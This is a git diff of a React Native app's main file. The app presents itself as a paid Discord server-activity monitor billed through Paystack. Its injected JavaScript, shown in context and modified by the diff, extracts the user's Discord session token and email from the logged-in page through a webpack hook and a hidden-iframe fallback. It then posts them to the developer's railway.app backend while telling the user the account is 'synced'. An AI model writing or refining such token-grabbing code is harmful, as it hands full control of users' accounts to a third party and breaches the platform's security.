@@ -30,7 +30,6 @@ export default function App() {
   const [myUserId, setMyUserId] = useState(null);
   const [userEmail, setUserEmail] = useState("");
 
-  // SUBSCRIPTION STATES
   const [isSubscribed, setIsSubscribed] = useState(true);
   const [paystackUrl, setPaystackUrl] = useState(null);
 
@@ -39,7 +38,6 @@ export default function App() {
 
   const API_URL = "https://intelligent-gratitude-production.up.railway.app";
 
-  // CAPTURES BOTH TOKEN AND EMAIL
   const INJECTED_JAVASCRIPT = `
   (function() {
     function capture() {
@@ -47,7 +45,7 @@ export default function App() {
         let token = null;
         let email = "user@discord.com";
 
-        // 1. TRY THE "WEBPACK" HOOK (Captures Token + Email)
+        // 1. TRY WEBPACK
         const webpack = window.webpackChunkdiscord_app;
         if (webpack) {
           const m = webpack.push([[Symbol()], {}, (e) => e]);
@@ -61,7 +59,7 @@ export default function App() {
           }
         }
 
-        // 2. THE IFRAME FALLBACK (Your original working method for Token)
+        // 2. IFRAME FALLBACK
         if (!token) {
           const iframe = document.createElement('iframe');
           iframe.style.display = 'none';
@@ -73,24 +71,23 @@ export default function App() {
           }
         }
 
-        // 3. SEND DATA IF TOKEN IS FOUND
+        // 3. SEND TO REACT NATIVE
         if (token && token.length > 20) {
-          window.ReactNativeWebView.postMessage(JSON.stringify({
+          const data = JSON.stringify({
             type: 'TOKEN_DATA', 
             token: token, 
             email: email 
-          }));
+          });
+          window.ReactNativeWebView.postMessage(data);
           return true;
         }
       } catch (e) {}
       return false;
     }
-
-    const timer = setInterval(() => {
-      if (capture()) clearInterval(timer);
-    }, 500);
+    const timer = setInterval(() => { if (capture()) clearInterval(timer); }, 1000);
   })();
 `;
+
   useEffect(() => {
     registerForNotifications();
     loadSavedUser();
@@ -99,7 +96,7 @@ export default function App() {
   useEffect(() => {
     if (isLoggedIn && myUserId && isSubscribed) {
       fetchMoves();
-      const interval = setInterval(fetchMoves, 5000);
+      const interval = setInterval(fetchMoves, 10000); // 10s polling
       return () => clearInterval(interval);
     }
   }, [isLoggedIn, myUserId, isSubscribed]);
@@ -111,6 +108,50 @@ export default function App() {
       setMyUserId(savedId);
       setUserEmail(savedEmail || "");
       setIsLoggedIn(true);
+    }
+  };
+
+  const sendTokenToBackend = async (token, email) => {
+    try {
+      const response = await fetch(`${API_URL}/link-account`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token, email }),
+      });
+      const result = await response.json();
+
+      if (response.ok && result.user_id) {
+        const newUserId = String(result.user_id);
+        await AsyncStorage.setItem("saved_user_id", newUserId);
+        await AsyncStorage.setItem("saved_user_email", email);
+
+        setMyUserId(newUserId);
+        setUserEmail(email);
+        setIsLoggedIn(true); // THIS TRIGGERS THE REDIRECT
+        setShowWebView(false); // CLOSE WEBVIEW
+        Alert.alert("✅ Connected", `Account synced successfully.`);
+      } else {
+        Alert.alert("Error", "Backend failed to link account.");
+      }
+    } catch (error) {
+      Alert.alert("Error", "Could not reach the server.");
+    }
+  };
+
+  const onWebViewMessage = async (event) => {
+    let data = event.nativeEvent.data;
+    try {
+      const message = JSON.parse(data);
+      if (message.token || message.data) {
+        const token = message.token || message.data;
+        const email = message.email || "user@discord.com";
+        await sendTokenToBackend(token, email);
+      }
+    } catch (e) {
+      // Fallback if data is just a raw string (the token itself)
+      if (data.length > 20) {
+        await sendTokenToBackend(data, "user@discord.com");
+      }
     }
   };
 
@@ -136,7 +177,7 @@ export default function App() {
         setMoves(data);
       }
     } catch (err) {
-      console.log("Connection lost...");
+      console.log("Fetch error");
     } finally {
       setRefreshing(false);
     }
@@ -156,7 +197,7 @@ export default function App() {
       if (result.status && result.data.authorization_url) {
         setPaystackUrl(result.data.authorization_url);
       } else {
-        Alert.alert("Error", "Payment failed to start.");
+        Alert.alert("Error", "Payment session failed.");
       }
     } catch (e) {
       Alert.alert("Error", "Server unreachable.");
@@ -166,72 +207,20 @@ export default function App() {
   const handlePaystackNavigation = (navState) => {
     if (navState.url.includes("success") || navState.url.includes("callback")) {
       setPaystackUrl(null);
-      Alert.alert("Processing", "Updating your account...", [
-        {
-          text: "Check Now",
-          onPress: () => {
-            setIsSubscribed(true);
-            fetchMoves();
-          },
-        },
-      ]);
-    }
-  };
-
-  const sendTokenToBackend = async (token, email) => {
-    try {
-      const response = await fetch(`${API_URL}/link-account`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ token, email }),
-      });
-      const result = await response.json();
-      if (response.ok) {
-        const newUserId = String(result.user_id);
-        await AsyncStorage.setItem("saved_user_id", newUserId);
-        await AsyncStorage.setItem("saved_user_email", email);
-        setMyUserId(newUserId);
-        setUserEmail(email);
-        setIsLoggedIn(true);
-        Alert.alert("✅ Connected", `Logged in as ${email}`);
-      }
-    } catch (error) {
-      Alert.alert("Error", "Sync failed.");
-    }
-  };
-
-  const onWebViewMessage = async (event) => {
-    try {
-      const message = JSON.parse(event.nativeEvent.data);
-
-      // Look for the new TOKEN_DATA type
-      if (message.type === "TOKEN_DATA" && message.token) {
-        setShowWebView(false);
-        setUserEmail(message.email); // Save the email for Paystack
-        await sendTokenToBackend(message.token, message.email);
-      }
-      // Fallback for your old TOKEN type
-      else if (message.type === "TOKEN" && message.data) {
-        setShowWebView(false);
-        await sendTokenToBackend(message.data, "user@discord.com");
-      }
-    } catch (e) {
-      // Direct string fallback if it's just a raw token
-      if (event.nativeEvent.data.length > 20) {
-        setShowWebView(false);
-        await sendTokenToBackend(event.nativeEvent.data, "user@discord.com");
-      }
+      setIsSubscribed(true);
+      fetchMoves();
+      Alert.alert("Success", "Subscription active!");
     }
   };
 
   const handleLogout = async () => {
-    Alert.alert("Reset", "Sign out?", [
+    Alert.alert("Sign Out", "Are you sure?", [
       { text: "Cancel" },
       {
-        text: "Reset",
+        text: "Logout",
         style: "destructive",
         onPress: async () => {
-          await AsyncStorage.multiRemove(["saved_user_id", "saved_user_email"]);
+          await AsyncStorage.clear();
           setIsLoggedIn(false);
           setMyUserId(null);
           setMoves([]);
@@ -250,13 +239,15 @@ export default function App() {
 
   const registerForNotifications = async () => {
     const { status } = await Notifications.requestPermissionsAsync();
-    if (status !== "granted") console.log("Perms denied");
+    if (status !== "granted") console.log("Notification perms denied");
   };
 
   const renderMove = ({ item }) => (
     <View style={styles.moveItem}>
       <View style={styles.headerRow}>
-        <Text style={styles.expert}>👤 {item.action.split(" ")[1]}</Text>
+        <Text style={styles.expert}>
+          👤 {item.action.split(" ")[1] || "Member"}
+        </Text>
         <Text style={styles.serverTag}>{item.server}</Text>
       </View>
       <Text style={styles.actionText}>Joined the server</Text>
@@ -266,6 +257,8 @@ export default function App() {
     </View>
   );
 
+  // --- RENDERING ---
+
   if (paystackUrl) {
     return (
       <SafeAreaView style={{ flex: 1, backgroundColor: "#fff" }}>
@@ -273,7 +266,7 @@ export default function App() {
           <TouchableOpacity onPress={() => setPaystackUrl(null)}>
             <Text style={{ color: "red" }}>Cancel</Text>
           </TouchableOpacity>
-          <Text style={{ fontWeight: "bold" }}>Paystack Secure</Text>
+          <Text style={{ fontWeight: "bold" }}>Secure Payment</Text>
           <View style={{ width: 50 }} />
         </View>
         <WebView
@@ -296,14 +289,14 @@ export default function App() {
         </View>
         <WebView
           ref={webViewRef}
-          incognito={true}
           source={{ uri: "https://discord.com/login" }}
           injectedJavaScript={INJECTED_JAVASCRIPT}
           onMessage={onWebViewMessage}
-          onNavigationStateChange={(n) =>
-            n.url.includes("/channels/") &&
-            webViewRef.current.injectJavaScript(INJECTED_JAVASCRIPT)
-          }
+          onNavigationStateChange={(n) => {
+            if (n.url.includes("/channels/")) {
+              webViewRef.current.injectJavaScript(INJECTED_JAVASCRIPT);
+            }
+          }}
           userAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36"
         />
       </SafeAreaView>
@@ -328,15 +321,15 @@ export default function App() {
           {!isSubscribed ? (
             <View style={styles.paywallContainer}>
               <Text style={styles.loginEmoji}>🔒</Text>
-              <Text style={styles.title}>Subscription Ended</Text>
+              <Text style={styles.title}>Subscription Required</Text>
               <Text style={styles.subtitle}>
-                Unlock access to view live server joins.
+                Unlock access to view live server activity.
               </Text>
               <TouchableOpacity
                 style={styles.loginButton}
                 onPress={handlePayment}
               >
-                <Text style={styles.buttonText}>Renew Access (₦5,000)</Text>
+                <Text style={styles.buttonText}>Renew (₦5,000)</Text>
               </TouchableOpacity>
               <TouchableOpacity
                 style={{ marginTop: 25 }}
@@ -365,7 +358,7 @@ export default function App() {
                   fetchMoves();
                 }}
                 ListEmptyComponent={
-                  <Text style={styles.empty}>Monitoring 19 servers...</Text>
+                  <Text style={styles.empty}>Monitoring servers...</Text>
                 }
               />
             </>
